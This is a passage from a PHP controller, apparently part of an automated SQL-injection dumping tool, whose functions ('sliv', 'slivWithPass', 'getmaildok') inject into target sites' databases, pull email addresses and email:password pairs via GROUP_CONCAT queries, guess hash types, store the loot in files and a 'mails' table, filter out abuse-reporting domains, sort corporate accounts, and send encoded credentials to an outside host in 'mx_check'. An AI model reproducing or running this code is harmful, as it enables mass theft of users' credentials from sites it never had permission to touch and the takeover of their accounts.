								$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
								$this->Post->query('UPDATE  `multis` SET  `prich` = \'Mnogo email_gavno 15000\'  WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
								return 'vpizdu';
							}

						}
						 else if (($this->email_gavno == 250) && ($this->up == false)) {
							echo 'Mnogo email_gavno 250';
							$this->logs('Mnogo email_gavno:' . $this->r, 'slivWithPassMssql');
							$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
							$this->Post->query('UPDATE  `multis` SET  `prich` = \'Mnogo email_gavno 250\'  WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
							return 'vpizdu';
						}

					}
				}
				 else {
					$this->null++;
					$this->d($this->null, 'count NULL TRIM');

					if ($this->up == true) {
						if (($this->null == 15000) && ($this->up == false)) {
							$this->d('Много пустных или null ' . $this->null);
							$this->logs('Mnogo null:' . $this->null . ' ' . $this->r, 'slivWithPassMssql');
							$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
							$this->Post->query('UPDATE  `multis` SET  `prich` = \'Mnogo null 15000\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
							$this->d('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
							return 'vpizdu';
						}

					}
					 else if (($this->null == 100) && ($this->up == false)) {
						$this->d('Много пустных или null ' . $this->null);
						$this->logs('Mnogo null:' . $this->null . ' ' . $this->r, 'slivWithPassMssql');
						$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
						$this->Post->query('UPDATE  `multis` SET  `prich` = \'Mnogo null 100\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
						$this->d('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
						return 'vpizdu';
					}

				}

				flush();
			}
			 else {
				$this->emp++;

				if (($this->emp == 55) && ($this->up == false)) {
					$this->d($this->emp, '$this->emp = 55vpizdu');
					$this->logs($this->emp . ' $this->emp = 55vpizdu:' . $this->r, 'slivWithPassMssql');
					$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
					$this->Post->query('UPDATE  `multis` SET  `prich`=\'this->emp = 55vpizdu vashe pusto\'  WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
					return 'vpizdu';
				}

			}

			++$i;
		}

		$this->Post->query('UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
	}

	public function getmaildok()
	{
		$settings['potok_one'] = $this->potok_one;
		$settings['dump_one_good'] = $this->dump_one_good;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass'] = $this->pass;
		$this->timeStart = $this->start('getmaildok', 1);

		if ($settings['pass'] == 1) {
			$data = $this->Post->query('SELECT * FROM  `fileds` WHERE `password`!=\'\' AND  `password`!=\':\' AND `get` = \'3\' AND dok < 4 ORDER BY  `fileds`.`count` DESC limit 1');

			if (count($data) == 0) {
				$this->stop();
				exit();
			}

		}
		 else if ($settings['pass'] == 2) {
			$data = $this->Post->query('SELECT * FROM  `fileds` WHERE (`password`=\'\' or `password`=\':\') AND `get` = \'3\' AND dok < 3 ORDER BY  `fileds`.`count` DESC limit 1');

			if (count($data) == 0) {
				$this->stop();
				exit();
			}

		}
		 else {
			$data = $this->Post->query('SELECT * FROM  `fileds` WHERE `password`!=\'\' AND  `password`!=\':\' AND `get` = \'3\' AND dok < 4 ORDER BY  `fileds`.`count` DESC limit 1');

			if (count($data) == 0) {
				$data = $this->Post->query('SELECT * FROM  `fileds` WHERE (`password`=\'\' or `password`=\':\') AND `get` = \'3\' AND dok < 4 ORDER BY  `fileds`.`count` DESC limit 1');

				if (count($data) == 0) {
					$this->stop();
					exit();
				}

			}

		}

		foreach ($data as $val ) {
			if ($val['fileds']['count'] < $val['fileds']['lastlimit']) {
				$data = $this->Post->query('UPDATE  `fileds` SET  `get` =  \'4\', `dok`= ' . $dok . ' WHERE  `fileds`.`id` =' . $val['fileds']['id']);
			}


			$dok = $val['fileds']['dok'];
			$dok = $dok + 1;
			$data = $this->Post->query('UPDATE  `fileds` SET  `get` =  \'1\', `dok`= ' . $dok . ' WHERE  `fileds`.`id` =' . $val['fileds']['id']);
			$this->Post->query('UPDATE  `starts` SET  `squle_id` = ' . $val['fileds']['id'] . ' WHERE  `time_start` =' . $this->timeStart);

			if (($val['fileds']['password'] !== '') && ($val['fileds']['password'] !== ':')) {
				$sliv = $this->slivWithPassConcast($val['fileds']['id']);
			}
			 else {
				$sliv = $this->sliv($val['fileds']['id']);
			}

			if ($sliv !== 'vpizdu') {
				$data = $this->Post->query('UPDATE  `fileds` SET  `get` =  \'2\' WHERE  `fileds`.`id` =' . $val['fileds']['id']);
			}
			 else {
				$data = $this->Post->query('UPDATE  `fileds` SET  `get` =  \'3\' WHERE  `fileds`.`id` =' . $val['fileds']['id']);
			}
		}

		$this->stop();
		exit('okay');
	}

	public function getmailfull()
	{
		$this->timeStart = $this->start('getmailfull', 1);
		$settings['potok_one'] = $this->potok_one;
		$settings['dump_one_good'] = $this->dump_one_good;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass'] = $this->pass;
		echo $settings['pass'] . '<br>';

		if ($settings['pass'] == 1) {
			$data = $this->Post->query('SELECT * FROM  `fileds` WHERE `password`!=\'\' AND  `password`!=\':\' AND `get` = \'\'  ORDER BY  `fileds`.`count` DESC limit 1');

			if (count($data) == 0) {
				$this->stop();
				exit('stop 1');
			}

		}
		 else if ($settings['pass'] == 2) {
			$data = $this->Post->query('SELECT * FROM  `fileds` WHERE (`password`=\'\' or `password`=\':\') AND `get` = \'\' ORDER BY  `fileds`.`count` DESC limit 1');

			if (count($data) == 0) {
				$this->stop();
				exit('stop 2');
			}

		}
		 else if ($settings['pass'] == 3) {
			$data = $this->Post->query('SELECT * FROM  `fileds` WHERE `password`!=\'\' AND  `password`!=\':\' AND `get` = \'\'  ORDER BY  `fileds`.`count` DESC limit 1');
			$this->d($data, 'pass 3');

			if (count($data) == 0) {
				$data = $this->Post->query('SELECT * FROM  `fileds` WHERE (`password`=\'\' or `password`=\':\') AND `get` = \'\' ORDER BY  `fileds`.`count` DESC limit 1');
				$this->d($data, 'mail 3');

				if (count($data) == 0) {
					$this->stop();
					exit('stop 3');
				}

			}

		}


		$this->d($data);

		foreach ($data as $val ) {
			$data = $this->Post->query('UPDATE  `fileds` SET  `get` =  \'1\' WHERE  `fileds`.`id` =' . $val['fileds']['id']);
			$this->Post->query('UPDATE  `starts` SET  `squle_id` = ' . $val['fileds']['id'] . ' WHERE  `time_start` =' . $this->timeStart);

			if (($val['fileds']['password'] !== '') && ($val['fileds']['password'] !== ':')) {
				$sliv = $this->slivWithPassConcast($val['fileds']['id']);
			}
			 else {
				$sliv = $this->sliv($val['fileds']['id']);
			}

			if ($sliv !== 'vpizdu') {
				$data = $this->Post->query('UPDATE  `fileds` SET  `get` =  \'2\' WHERE  `fileds`.`id` =' . $val['fileds']['id']);
			}
			 else {
				$data = $this->Post->query('UPDATE  `fileds` SET  `get` =  \'3\' WHERE  `fileds`.`id` =' . $val['fileds']['id']);
			}
		}

		$this->stop();
		exit('okay');
	}

	public function sliv($id = 0)
	{
		$mail = $this->Filed->findbyid($id);
		$squle = $this->Post->query('SELECT * FROM  `posts` WHERE id = ' . $mail['Filed']['post_id'] . ' limit 0,1');

		if (2 < strlen($squle[0]['posts']['sleep'])) {
			$set = $squle[0]['posts']['sleep'];
			$this->d($set, 'SET emailS');
		}
		 else {
			$set = false;
		}

		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$this->mysqlInj->inject($squle[0]['posts']['header'] . '::' . $squle[0]['posts']['gurl'], $squle[0], $set);
		$bd = explode(':', $mail['Filed']['ipbase']);
		$count = $mail['Filed']['count'];
		$shag = 15;
		$zapr = round($count / $shag);

		if ($zapr == 0) {
			$zapr = 1;
		}


		$start = 0;
		$url = parse_url($squle[0]['posts']['url']);
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone) - 1];
		$filename = './sliv/' . $zone . '_' . $url['host'] . '.txt';
		$ff = intval($mail['Filed']['lastlimit']);
		$this->d($ff, 'lastlimit');

		if ($ff !== 0) {
			$start = $ff;
			$ff = $ff / 40;
		}
		 else {
			$ff = 0;
		}

		$d = 0;
		$time = time();
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		$i = $ff;

		while ($i < $zapr) {
			$this->workup();
			$new = time();
			$razn = $new - $time;

			if (20 < $razn) {
				return 'vpizdu';
			}


			$time = time();
			++$d;
			$this->Post->query('UPDATE  `fileds` SET  `lastlimit` = ' . $start . ' WHERE  `id`=' . intval($id) . ' ');
			$mysql = $this->mysqlInj->mysqlGetValue('', '(SELECT ' . $mail['Filed']['label'] . ' FROM ' . $bd[1] . '.`' . $mail['Filed']['table'] . '` WHERE `' . $mail['Filed']['label'] . '` LIKE char(' . $this->charcher('%@%') . ') LIMIT ' . $start . ',' . $shag . ')t ', 'GROUP_CONCAT(t.' . $mail['Filed']['label'] . ')', 0, array());
			$this->d($mysql);
			$start = $start + $shag;

			if (($i == 0) && !(isset($mysql['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ')']))) {
				fclose($fh);
				$this->Post->query('UPDATE  `fileds` SET  `function` = 1 WHERE  `id` =' . $id . ' ');

				if ($this->slivone($id) == 'vpizdu') {
					return 'vpizdu';
				}


				break;
			}


			if (trim($mysql['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ')']) !== '') {
				$mails = explode(',', $mysql['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ')']);
				$tmp = array();
				$tmp3 = array();

				foreach ($mails as $value ) {
					if (trim($value) !== '') {
						fwrite($fh, trim($value) . "\n");
					}


					preg_match('/\A(?:^([a-z0-9][a-z0-9_\-\.\+]*)@([a-z0-9][a-z0-9\.\-]{0,63}\.([a-z]{2,4}))$)\z/i', $value, $z);

					if ($z[0] != '') {
						@$key = array_search($z[0], $tmp);
						@$key2 = array_search(strlen($z[0]), array_slice($this->tmp2, count($this->tmp2) - 1));
						$this->tmp2[] = strlen($z[0]);
						$tmp[] = $z[0];

						if ($key === false) {
							echo $value . '<br>';
							$m = explode('@', $z[0]);

							if ($key2 !== false) {
								$this->l2++;
								$this->d($this->l2, 'l2');

								if (40 < $this->l2) {
									$this->d($this->l2, 'vpizdu');

									return 'vpizdu';
									$this->l2--;
								}

							}
							 else {
								$this->l2--;
							}

							echo '-------<br>';
							$this->Post->query('INSERT INTO mails (email,pass,date,domen,hashtype,bd,zona,meiler) VALUES(\'' . $z[0] . '\',\'0\',now(),\'' . $url[host] . '\',\'0\',\'' . $bd[1] . '\',\'' . $zone . '\',\'' . $m[1] . '\')');
						}

					}

				}
			}


			++$i;
		}

		fclose($fh);
		$this->renamename($filename);
	}

	public function slivone($id)
	{
		$hunta = 1;
		$mail = $this->Filed->findbyid($id);
		$squle = $this->Post->query('SELECT * FROM `posts` WHERE id = ' . $mail['Filed']['post_id'] . ' limit 0,1');

		if (2 < strlen($squle[0]['posts']['sleep'])) {
			$set = $squle[0]['posts']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->d($set, 'SET email odin');
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$this->mysqlInj->inject($squle[0]['posts']['header'] . '::' . $squle[0]['posts']['gurl'], $squle[0], $set);
		$bd = explode(':', $mail['Filed']['ipbase']);
		$count = $mail['Filed']['count'];
		$start = 0;
		$url = parse_url($squle['Post']['url']);
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone) - 1];
		$filename = 'sliv/' . $zone . '_' . $url['host'] . '.txt';
		$fh = fopen($filename, 'a+');
		$ff = intval($mail['Filed']['lastlimit']);
		$time = time();
		$tmp = array();
		$tmp3 = array();
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		$i = $ff;

		while ($i < $count) {
			$this->workup();
			$new = time();
			$razn = $new - $time;

			if (30 < $razn) {
				return 'vpizdu';
			}


			$this->Post->query('UPDATE  `fileds` SET  `lastlimit` = ' . $i . ' WHERE  `id`=' . intval($id) . ' ');
			$mysql = $this->mysqlInj->mysqlGetValue($bd[1], $mail['Filed']['table'], $mail['Filed']['label'], $i, array(), ' WHERE `' . $mail['Filed']['label'] . '` LIKE char(' . $this->charcher('%@%') . ')');

			if (trim($mysql[$mail['Filed']['label']]) !== '') {
				fwrite($fh, trim($mysql[$mail['Filed']['label']]) . "\n");
				preg_match('/\A(?:^([a-z0-9][a-z0-9_\-\.\+]*)@([a-z0-9][a-z0-9\.\-]{0,63}\.([a-z]{2,4}))$)\z/i', $value, $z);

				if ($z[0] != '') {
					@$key = array_search($z[0], $tmp);
					$tmp[] = $z[0];
					@$key2 = array_search(strlen($z[0]), array_slice($this->tmp2, count($this->tmp2) - 1));

					if ($key === false) {
						echo $z[0] . '<br>';
						$m = explode('@', $z[0]);

						if ($key2 !== false) {
							$this->l2++;
							$this->d($this->l2, 'l2');

							if (25 < $this->l2) {
								return 'vpizdu';
								$this->l2--;
							}

						}
						 else {
							$this->l2--;
						}

						echo '-------<br>';
						$this->Post->query('INSERT INTO mails (email,pass,date,domen,hashtype,bd,zona,meiler) VALUES(\'' . $z[0] . '\',\'0\',now(),\'' . $url[host] . '\',\'0\',\'' . $bd[1] . '\',\'' . $zone . '\',\'' . $m[1] . '\')');
						$hunta = 0;
					}

				}

			}
			 else {
				$hunta = $hunta + 1;
			}

			if ($hunta == 20) {
				break;
			}


			++$i;
		}

		fclose($fh);
	}

	public function slivWithPassConcast($id = 9)
	{
		$mail = $this->Filed->findbyid($id);
		$squle = $this->Post->query('SELECT * FROM  `posts` WHERE id = ' . $mail['Filed']['post_id'] . ' limit 0,1');

		if (2 < strlen($squle[0]['posts']['sleep'])) {
			$set = $squle[0]['posts']['sleep'];
			$this->d($set, 'pass SET dump');
		}
		 else {
			$set = false;
		}

		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$this->mysqlInj->inject($squle[0]['posts']['header'] . '::' . $squle[0]['posts']['gurl'], $squle[0], $set);
		$bd = explode(':', $mail['Filed']['ipbase']);
		$count = $mail['Filed']['count'];
		$shag = 20;
		$zapr = round($count / $shag);

		if ($zapr == 0) {
			$zapr = 1;
		}


		$start = 0;
		$url = parse_url($squle[0]['posts']['url']);
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone) - 1];
		$filename = './sliv/' . $zone . '_' . $url['host'] . '.txt';
		$ff = intval($mail['Filed']['lastlimit']);

		if ($ff !== 0) {
			$start = $ff;
			$ff = $ff / 20;
		}
		 else {
			$ff = 0;
		}

		$fh = fopen($filename, 'a+');
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		$this->l5 = 0;
		$this->tmp5 = array();
		$i = $ff;

		while ($i < $zapr) {
			$this->workup();
			$pass = explode(':', $mail['Filed']['password']);
			$pass = $pass[1];
			$this->Post->query('UPDATE  `fileds` SET  `lastlimit` = ' . $start . ' WHERE  `id`=' . intval($id) . ' ');
			$mysql = $this->mysqlInj->mysqlGetValue('', '(SELECT+' . $mail['Filed']['label'] . ',' . $pass . ' FROM ' . $bd[1] . '.`' . $mail['Filed']['table'] . '` WHERE `' . $mail['Filed']['label'] . '` LIKE char(' . $this->charcher('%@%') . ') LIMIT ' . $start . ',' . $shag . ')t ', 'GROUP_CONCAT(t.' . $mail['Filed']['label'] . ',char(' . $this->charcher(':') . '),t.' . $pass . ')', 0, array());
			$start = $start + $shag;

			if (($i == 0) && !(isset($mysql['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ',char(' . $this->charcher(':') . '),t.' . $pass . ')']))) {
				fclose($fh);
				$this->Post->query('UPDATE  `fileds` SET  `function` = 1 WHERE  `id` =' . $id . ' ');
				$this->slivWithPass($id);
				break;
			}


			if (trim($mysql['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ',char(' . $this->charcher(':') . '),t.' . $pass . ')']) !== '') {
				$mails = explode(',', $mysql['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ',char(' . $this->charcher(':') . '),t.' . $pass . ')']);
				$null = 0;
				$l = 0;
				$tmp = array();
				$tmp3 = array();

				foreach ($mails as $value ) {
					echo '||' . $value . '||<br/>';
					fwrite($fh, trim($value) . "\n");
					$p = explode(':', $value);

					if (!(isset($p[1]))) {
						$pass = '';
					}
					 else {
						$pass = trim($p[1]);
					}

					@$key0 = array_search($pass, $this->stopword);

					if (($key0 === false) && (2 < strlen($pass))) {
						$ht = $this->hashtype($pass);

						if ($ht != 1) {
							$this->hashtype = $ht;
						}
						 else {
							$this->hashtype = '0';
						}

						preg_match(
						    '/\A(?:^([a-z0-9][a-z0-9_\-\.\+]*)@([a-z0-9][a-z0-9\.\-]{0,63}\.([a-z]{2,4}))$)\z/i', $p[0], $z);

						if ($z[0] != '') {
							$m = explode('@', $z[0]);
							@$key = array_search($pass, $tmp);
							@$key2 = array_search(strlen($pass), array_slice($this->tmp2, count($this->tmp2) - 1));
							@$key5 = array_search(strlen($z[0]), array_slice($this->tmp5, count($this->tmp5) - 1));
							@$key3 = array_search($p[0], $tmp3);
							$this->d(array_slice($this->tmp2, count($this->tmp2) - 1), 'slice');
							$this->d(strlen($pass), 'strlen');
							$tmp[] = $pass;
							$tmp3[] = $p[0];
							$this->tmp2[] = strlen($pass);
							$this->tmp5[] = strlen($z[0]);
							$this->d($key2, 'key');

							if ($this->hashtype == '0') {
								if (($key2 !== false) && ($this->k < 6)) {
									$this->l2++;

									if (7 < $this->l2) {
										$this->hashtype = 'unkown';
									}

								}
								 else {
									$this->k++;
								}
							}


							if ($key5 !== false) {
								$this->l5++;
								$this->d($this->l5, 'l5');

								if (45 < $this->l5) {
									return 'vpizdu';
									$this->l5--;
								}

							}
							 else {
								$this->l5--;
							}

							if (($key === false) && ($key3 === false)) {
								echo '-------<br>';
								$this->Post->query('INSERT INTO mails (email,pass,date,domen,hashtype,bd,zona,meiler) VALUES(\'' . $p[0] . '\',\'' . $pass . '\',now(),\'' . $url[host] . '\',\'' . $this->hashtype . '\',\'' . $bd[1] . '\',\'' . $zone . '\',\'' . $m[1] . '\')');
								echo 'OK<br>';
								fwrite($fh, trim($value) . "\n");
							}
							 else {
								++$l;

								if ($l == 20) {
									return;
								}


								echo $key . '<br>';
							}
						}

					}
					 else {
						++$null;

						if ($null == 10) {
							echo 'Много пустных или null';

							return;
						}

					}

					flush();
				}
			}


			++$i;
		}

		fclose($fh);
		$this->renamename($filename);
	}

	public function slivWithPass($id = 9)
	{
		$hunta = 1;
		$mail = $this->Filed->findbyid($id);
		$squle = $this->Post->query('SELECT * FROM  `posts` WHERE id = ' . $mail['Filed']['post_id'] . ' limit 0,1');

		if (2 < strlen($squle[0]['posts']['sleep'])) {
			$set = $squle[0]['posts']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->d($set, 'pass SET dump odin');
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$this->mysqlInj->inject($squle[0]['posts']['header'] . '::' . $squle[0]['posts']['gurl'], $squle[0], $set);
		$bd = explode(':', $mail['Filed']['ipbase']);
		$count = $mail['Filed']['count'];
		$start = 0;
		$url = parse_url($squle[0]['posts']['url']);
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone) - 1];
		$filename = './sliv/' . $zone . '_' . $url['host'] . '.txt';
		$fh = fopen($filename, 'a+');
		$pass = explode(':', $mail['Filed']['password']);
		$pass = $pass[1];
		$ff = intval($mail['Filed']['lastlimit']);
		$null = 0;
		$l = 0;
		$tmp = array();
		$tmp3 = array();
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		$this->l5 = 0;
		$this->tmp5 = array();
		$i = $ff;

		while ($i < $count) {
			$this->workup();
			$this->Post->query('UPDATE  `fileds` SET  `lastlimit` = ' . $i . ' WHERE  `id`=' . intval($id) . ' ');
			$mysql = $this->mysqlInj->mysqlGetValue($bd[1], $mail['Filed']['table'], array($mail['Filed']['label'], $pass), $i, array(), ' WHERE `' . $mail['Filed']['label'] . '` LIKE char(' . $this->charcher('%@%') . ')');
			$this->d($mysql);

			if (trim($mysql[$mail['Filed']['label']]) !== '') {
				echo $mysql[$mail['Filed']['label']] . ':' . $mysql[$pass] . '||<br/>';
				fwrite($fh, $mysql[$mail['Filed']['label']] . ':' . $mysql[$pass] . "\n");
				$ht = $this->hashtype($mysql[$pass]);

				if ($ht != 1) {
					$this->hashtype = $ht;
				}
				 else {
					$this->hashtype = '0';
				}

				@$key0 = array_search($pass, $this->stopword);

				if (($key0 === false) && (2 < strlen($pass))) {
					$pass2 = $mysql[$pass];
					preg_match('/\A(?:^([a-z0-9][a-z0-9_\-\.\+]*)@([a-z0-9][a-z0-9\.\-]{0,63}\.([a-z]{2,4}))$)\z/i', $mysql[$mail['Filed']['label']], $z);

					if ($z[0] != '') {
						$m = explode('@', $z[0]);
						@$key = array_search($pass2, $tmp);
						@$key2 = array_search(strlen($pass2), array_slice($this->tmp2, count($this->tmp2) - 1));
						@$key3 = array_search($mysql[$mail['Filed']['label']], $tmp3);
						@$key5 = array_search(strlen($z[0]), array_slice($this->tmp5, count($this->tmp5) - 1));
						$this->tmp5[] = strlen($z[0]);
						$this->tmp2[] = strlen($pass2);
						$tmp[] = $pass2;
						$tmp3[] = $mysql[$mail['Filed']['label']];
						$this->d(array_slice($this->tmp2, count($this->tmp2) - 1), 'slice');
						$this->d(strlen($pass2), 'strlen');

						if ($this->hashtype == '0') {
							$this->d($this->hashtype, 'hash');

							if (($key2 !== false) && ($this->k < 6)) {
								$this->l2++;

								if (7 < $this->l2) {
									$this->hashtype = 'unkown';
								}

							}
							 else {
								$this->k++;
							}
						}


						if ($key5 !== false) {
							$this->l5++;
							$this->d($this->l5, 'буква L5');

							if (35 < $this->l5) {
								return 'vpizdu';
								$this->l5--;
							}

						}
						 else {
							$this->l5--;
						}

						if (($key === false) && ($key3 === false)) {
							echo '-------<br>';
							$this->Post->query('INSERT INTO mails (email,pass,date,domen,hashtype,bd,zona,meiler) VALUES(\'' . $mysql[$mail[Filed][label]] . '\',\'' . $mysql[$pass] . '\',now(),\'' . $url[host] . '\',\'' . $this->hashtype . '\',\'' . $bd[1] . '\',\'' . $zone . '\',\'' . $m[1] . '\')');
							echo 'OK<br>';
						}
						 else {
							++$l;

							if ($l == 20) {
								return;
							}


							echo $key . '<br>';
						}
					}

				}
				 else {
					++$null;

					if ($null == 8) {
						echo 'Много пустых или null';
						return;
					}

				}

				flush();
				$hunta = 0;
			}
			 else {
				$hunta = $hunta + 1;
				echo $hunta . '<br>';
			}

			if ($hunta == 20) {
				fclose($fh);
				return;
			}


			++$i;
		}

		fclose($fh);
	}

	public function abuse()
	{
		$this->timeStart = $this->start('abuse', 1);
		$aaa = file('abuse.txt');

		foreach ($aaa as $aa ) {
			$abuse[trim(strtolower($aa))] = trim(strtolower($aa));
		}

		$file = $this->Post->query('SELECT `id`,`email` FROM `mails` WHERE `abuse`=0 limit 50000');

		foreach ($file as $val ) {
			$ku = 0;
			$dom = strtolower(trim($val['mails']['email']));

			if (isset($abuse[$dom])) {
				$ku = 2;
			}
			 else {
				$ku = 1;
			}

			$this->d($dom . ' -- ' . $ku);

			if ($ku == 2) {
				$this->Post->query('UPDATE `mails` SET `abuse`=2 WHERE `id`=' . $val['mails']['id']);
			}
			 else {
				$this->Post->query('UPDATE `mails` SET `abuse`=1 WHERE `id`=' . $val['mails']['id']);
			}

			unset($ku);
		}

		$file2 = $this->Post->query('SELECT `id`,`email` FROM `mails_one` WHERE `abuse`=0 limit 50000');

		foreach ($file2 as $val2 ) {
			$ku2 = 0;
			$dom2 = strtolower(trim($val2['mails_one']['email']));

			if (isset($abuse[$dom2])) {
				$ku2 = 2;
			}
			 else {
				$ku2 = 1;
			}

			$this->d($dom2 . ' -- ' . $ku2);

			if ($ku2 == 2) {
				$this->Post->query('UPDATE `mails` SET `abuse`=2 WHERE `id`=' . $val2['mails_one']['id']);
			}
			 else {
				$this->Post->query('UPDATE `mails` SET `abuse`=1 WHERE `id`=' . $val2['mails_one']['id']);
			}

			unset($ku2);
		}

		$this->Filed->query('DELETE FROM `mails` WHERE `abuse` = 2');
		$this->Filed->query('DELETE FROM `mails_one` WHERE `abuse` = 2');
		$this->stop();
	}

	public function typecorp_pass()
	{
		$this->timeStart = $this->start('typecorp_pass', 1);
		$aaa = file('bigs.txt');

		foreach ($aaa as $aa ) {
			$bigs[trim($aa)] = trim($aa);
		}

		$bbb = file('sred.txt');

		foreach ($bbb as $bb ) {
			$sreds[trim($bb)] = trim($bb);
		}

		$file = $this->Post->query('SELECT `id`,`email` FROM `mails` WHERE `type`=\'0\' limit 100000');

		foreach ($file as $val ) {
			$ku = '';
			$em = explode('@', $val['mails']['email']);
			$dom = trim($em[1]);
			$dom = strtolower($dom);

			if (isset($bigs[$dom])) {
				$ku = 'big';
			}
			 else if (isset($sreds[$dom])) {
				$ku = 'sred';
			}
			 else {
				$ku = 'corp';
			}

			$this->d($dom . ' -- ' . $ku);

			if ($ku == 'big') {
				$this->Post->query('UPDATE `mails` SET `type`=\'big\' WHERE id=' . $val['mails']['id']);
			}
			 else if ($ku == 'sred') {
				$this->Post->query('UPDATE `mails` SET `type`=\'sred\' WHERE id=' . $val['mails']['id']);
			}
			 else {
				$this->Post->query('UPDATE `mails` SET `type`=\'corp\' WHERE id=' . $val['mails']['id']);
			}

			unset($ku);
		}

		$this->stop();
	}

	public function typecorp_one()
	{
		$this->timeStart = $this->start('typecorp_one', 1);
		$aaa = file('bigs.txt');

		foreach ($aaa as $aa ) {
			$bigs[trim($aa)] = trim($aa);
		}

		$bbb = file('sred.txt');

		foreach ($bbb as $bb ) {
			$sreds[trim($bb)] = trim($bb);
		}

		$file = $this->Post->query('SELECT `id`,`email` FROM `mails_one` WHERE `type`=\'0\' limit 100000');

		foreach ($file as $val ) {
			$ku = '';
			$em = explode('@', $val['mails_one']['email']);
			$dom = trim($em[1]);
			$dom = strtolower($dom);

			if (isset($bigs[$dom])) {
				$ku = 'big';
			}
			 else if (isset($sreds[$dom])) {
				$ku = 'sred';
			}
			 else {
				$ku = 'corp';
			}

			$this->d($dom . ' -- ' . $ku);

			if ($ku == 'big') {
				$this->Post->query('UPDATE `mails_one` SET `type`=\'big\' WHERE id=' . $val['mails_one']['id']);
			}
			 else if ($ku == 'sred') {
				$this->Post->query('UPDATE `mails_one` SET `type`=\'sred\' WHERE id=' . $val['mails_one']['id']);
			}
			 else {
				$this->Post->query('UPDATE `mails_one` SET `type`=\'corp\' WHERE id=' . $val['mails_one']['id']);
			}

			unset($ku);
		}

		$this->stop();
	}

	public function sort_emails()
	{
		if ($this->debug) {
			$this->writelogs('zapusk sort', 'DEBUG.txt');
		}


		$dbpath = $this->corp;
		$dir = opendir($dbpath);
		$i = 0;
		$lll = 0;

		while (false !== $file = readdir($dir)) {
			if (($file != '.') && ($file != '..') && ($file != 'Thumbs.db')) {
				$file2 = file($dbpath . $file);
				++$i;
				$count = sizeof($file2) - 1;
				$lll = $lll + $count;
			}

		}

		$this->d($lll, 'lll');
		exit();

		if ($lll < 5000) {
			$this->d('$lll < 5000');
			$file = $this->Post->query('SELECT `id`,`email`,`pass` FROM `mails` WHERE `type`=\'corp\' AND pass !=\'0\' AND hashtype =\'0\' AND mx=\'0\' limit 1000');

			if (count($file) == 0) {
				foreach ($file as $val ) {
					$this->d($val);
					$login = $val['mails']['email'];
					$pass = $val['mails']['pass'];
					$explp = explode('@', $login);
					$domain = $explp[1];
					$this->d($dbpath . $domain . '.txt');
					$write_file = fopen($dbpath . $domain . '.txt', 'a+');
					fputs($write_file, "\n" . $login . ':' . $pass);
					fclose($write_file);
					$this->Post->query('UPDATE  `mails` SET  `mx` = \'1\' WHERE  `id` =' . $val['mails']['id']);
				}
			}

		}


		exit();
	}

	public function mx_check()
	{
		$gc_dbpath = 'korporate/';
		$endc = $this->count_f($gc_dbpath);
		$startc = 0;

		while ($startc < $endc) {
			$startc = $startc + 1;
			$accsdir = $this->show_f($gc_dbpath, $startc);
			$file_tmp = file($accsdir);
			$costr = count($file_tmp);

			if ($costr < 1) {
				unlink($accsdir);
			}
			 else {
				while (0 < $costr) {
					@$reboot_thread_count = $reboot_thread_count + 1;

					if (400 < $reboot_thread_count) {
						exit();
					}


					$costr = $costr - 1;
					$acce = $this->get_and_explode($accsdir);
					$filesize = filesize($accsdir);

					if ($filesize < 8) {
						unlink($accsdir);
					}


					if (empty($acce[0]) && empty($acce[1])) {
					}
					 else {
						$acc = urlencode($acce[0] . ':' . $acce[1]);
						$acc = trim($acc);
						$this->d('zapusk ' . $acc);
						$acc = base64_encode($ku);
						$url = 'http://replica-2.ru/posts/mx_check_one/' . $acc;
						file_get_contents($url);

						if ($this->debug) {
							$this->writelogs('file_get_contents=(' . $url, 'DEBUG.txt');
						}


						usleep(300000);
					}

					exit();
				}
			}

			usleep(200000);
		}
	}

	public function get_and_explode($file_from)
	{
		if ($this->debug) {
			$this->writelogs('get_and_explode(in) $file_from=' . $file_from, 'DEBUG.txt');
		}


		$getlpa = file($file_from);
		$loginpass = $getlpa[0];
		$id = '1';

		if ($id != '') {
			--$id;
			$file = file($file_from);
			$i = 0;

